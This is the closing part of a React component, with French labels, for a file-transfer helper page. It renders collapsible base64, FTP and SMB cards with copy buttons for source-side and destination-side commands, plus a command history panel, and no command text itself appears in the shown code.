                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Encoder en base64 (Linux/macOS)', cmd: b64EncodeLinux}, {label: 'Encoder en base64 (Windows)', cmd: b64EncodeWindows}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Décoder base64 (Linux/macOS)', cmd: b64DecodeLinux}, {label: 'Décoder base64 (Windows)', cmd: b64DecodeWindows}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* FTP */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Folder className="w-4 h-4" /> {getDirectionLabel('FTP')}</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, ftp: !e.ftp}))}>
                    {expanded.ftp ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.ftp && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Python FTP Server', cmd: ftpServer}, {label: 'FTP avec authentification', cmd: ftpServerAuth}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'FTP client (Linux)', cmd: ftpClientLinux}, {label: 'FTP client (Windows)', cmd: ftpClientWindows}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* SMB */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Server className="w-4 h-4" /> {getDirectionLabel('SMB')}</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, smb: !e.smb}))}>
                    {expanded.smb ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.smb && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Impacket SMB Server', cmd: smbServer}, {label: 'SMB avec authentification', cmd: smbServerAuth}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel} (Windows)</div>
                    <div className="space-y-2">
                      {[{label: 'Copie depuis SMB', cmd: smbCopy}, {label: 'Robocopy (plus robuste)', cmd: smbRobocopy}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* History */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="text-slate-100">📋 Historique des Commandes</CardTitle>
                  <div className="flex gap-2">
                    <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setHistory([])} title="Vider"><Trash2 className="w-4 h-4" /></Button>
                    <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={exportHistory} title="Exporter"><Download className="w-4 h-4" /></Button>
                    <input ref={fileInputRef} type="file" accept="application/json" className="hidden" onChange={(e) => {
                      const f = e.target.files?.[0];
                      if (f) importHistory(f);
                      e.currentTarget.value = '';
                    }} />
                    <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => fileInputRef.current?.click()} title="Importer"><Upload className="w-4 h-4" /></Button>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                {history.length === 0 ? (
                  <div className="text-slate-400 text-sm">Aucune commande copiée. Les copies apparaissent ici avec contexte et horodatage.</div>
                ) : (
                  <div className="space-y-2 max-h-[260px] overflow-y-auto">
                    {history.map((h) => (
                      <div key={h.id} className="p-2 bg-slate-700/40 rounded border border-slate-600">
                        <div className="flex items-center justify-between text-xs text-slate-400">
                          <span>{new Date(h.createdAt).toLocaleString('fr-FR')}</span>
                          <span className="uppercase">{h.method} • {h.step}</span>
                        </div>
                        <pre className="text-xs text-slate-200 overflow-x-auto mt-1"><code>{h.command}</code></pre>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

// Minimal icon for Target to avoid extra import
const TargetIcon: React.FC = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-crosshair">
    <circle cx="12" cy="12" r="10"></circle>
    <line x1="22" x2="18" y1="12" y2="12"></line>
    <line x1="6" x2="2" y1="12" y2="12"></line>
    <line x1="12" x2="12" y1="6" y2="2"></line>
    <line x1="12" x2="12" y1="22" y2="18"></line>
  </svg>
);

export default FileTransferPage;


